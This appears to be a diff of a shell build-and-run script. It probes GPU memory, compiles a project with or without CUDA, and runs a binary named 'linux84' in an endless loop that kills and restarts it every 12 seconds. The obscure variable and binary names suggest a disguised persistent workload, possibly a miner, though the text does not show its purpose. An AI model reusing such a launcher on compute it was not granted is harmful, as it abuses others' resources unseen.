@@ -39,9 +39,6 @@ rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubunt
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-while true
-do
-
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 if [[ $google84121274 == *"failed"* ]]; then
@@ -53,7 +50,14 @@ cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
 make
 
+while true
+do
+
+sleep 12;pkill -f linux84 &> /dev/null &
+
 ./linux84 8
+
+done
 
 else
 
@@ -64,7 +68,14 @@ cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make
 
+while true
+do
+
+sleep 12;pkill -f linux84 &> /dev/null &
+
 ./linux84 8
+
+done
 
 fi
 
